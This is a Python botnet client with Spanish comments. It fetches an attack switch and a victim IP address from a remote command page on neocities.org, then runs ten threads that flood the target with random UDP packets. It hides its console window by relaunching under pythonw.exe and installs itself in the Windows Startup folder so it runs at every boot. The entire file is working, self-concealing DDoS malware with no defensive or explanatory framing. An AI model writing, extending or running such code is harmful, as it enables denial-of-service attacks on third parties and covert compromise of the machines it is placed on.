import os
import sys
import threading
import random
import socket
import requests
import re
import time
import subprocess

try:
    import psutil
    import win32com.client  # Para crear el acceso directo en el inicio
except ImportError:
    print("Necesitas instalar 'psutil' y 'pywin32'. Ejecuta 'pip install psutil pywin32'.")

# Configuración global
num_bots = 10  # Número de threads para el ataque
running = True
data_limit = 1 * 1024**4  # Límite de 1 Terabyte por bot
attack_type = "VOLUMETRIC"

# Variables para verificar cambios en URLs
previous_note_content = ""
previous_victim_ip = ""

# Función para obtener la IP del objetivo
def fetch_target_ip():
    try:
        response = requests.get("https://rsc-site.neocities.org/victim")
        ip_address = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", response.text)
        if ip_address:
            print(f"IP objetivo obtenida: {ip_address[0]}")
            return ip_address[0]
        else:
            print("No se encontró una IP válida en la URL de destino.")
            return None
    except Exception as e:
        print("Error al obtener la IP del objetivo:", e)
        return None

# Función para verificar si el ataque está habilitado
def is_attack_enabled():
    try:
        response = requests.get("https://rsc-site.neocities.org/note")
        enabled = "true" in response.text.lower()
        print(f"Estado de habilitación de ataque: {enabled}")
        return enabled
    except Exception as e:
        print("Error al verificar el estado de habilitación del ataque:", e)
        return False

# Función de ataque ejecutada por cada bot
def attack(bot_id, target_ip, packet_size=10240):
    total_data_sent = 0
    global running
    print(f"Bot {bot_id} iniciando ataque a {target_ip}")  # Mensaje al iniciar el ataque
    
    while total_data_sent < data_limit and running:
        try:
            if attack_type == "VOLUMETRIC":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    packet = random._urandom(packet_size)
                    random_port = random.randint(1, 65535)
                    s.sendto(packet, (target_ip, random_port))
                    total_data_sent += len(packet)
        except Exception as e:
            print(f"Bot {bot_id}: Error -", e)

# Función principal que ejecuta el ataque en bucle con un retraso
def run_attack():
    global previous_note_content, previous_victim_ip
    while True:
        try:
            current_attack_enabled = is_attack_enabled()
            current_victim_ip = fetch_target_ip()

            if current_attack_enabled and current_victim_ip:
                if current_victim_ip != previous_victim_ip or current_attack_enabled != (previous_note_content == "true"):
                    previous_note_content = "true" if current_attack_enabled else "false"
                    previous_victim_ip = current_victim_ip
                    
                    print("Iniciando ataque debido a cambios detectados.")
                    threads = []
                    for i in range(num_bots):
                        bot_thread = threading.Thread(target=attack, args=(i, current_victim_ip))
                        threads.append(bot_thread)
                        bot_thread.start()

                    for thread in threads:
                        thread.join()
                else:
                    print("Condiciones cumplidas pero sin cambios desde la última ejecución.")
            else:
                print("Condiciones no cumplidas para el ataque (ataque no habilitado o sin IP objetivo).")
            time.sleep(63)
        except Exception as e:
            print("Error durante la verificación de URL o ejecución del ataque:", e)

# Función para verificar si el script ya se está ejecutando en segundo plano
def is_running_in_background():
    current_pid = os.getpid()
    for process in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if process.info['pid'] != current_pid and process.info['cmdline'] and os.path.abspath(__file__) in process.info['cmdline']:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

# Función para relanzar el script en segundo plano usando pythonw.exe
def run_with_pythonw():
    if sys.platform == "win32" and "python.exe" in sys.executable:
        # Determinar si el sistema es de 32 o 64 bits y ejecutar pythonw.exe
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw_path, os.path.abspath(__file__)])
        sys.exit()  # Cierra el proceso actual para ocultar la terminal

# Función para añadir el script a la carpeta de inicio de Windows
def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_folder, 'rscbotnet.lnk')

    # Verifica si el acceso directo ya existe
    if os.path.exists(shortcut_path):
        print("El programa ya está configurado para iniciar automáticamente.")
        return

    try:
        # Crea un acceso directo en la carpeta de inicio
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path  # Opcional, si tienes un ícono personalizado
        shortcut.save()
        print("El programa se ha configurado para iniciar automáticamente.")
    except Exception as e:
        print("Error al añadir el programa al inicio automático:", e)

if __name__ == "__main__":
    # Añadir el script a inicio automático si aún no está agregado
    add_to_startup()

    # Ejecuta en segundo plano con pythonw.exe si es necesario
    run_with_pythonw()

    # Ejecuta el ataque en segundo plano si no se está ejecutando ya
    if not is_running_in_background():
        run_attack()
    else:
        print("El script ya se está ejecutando en segundo plano.")
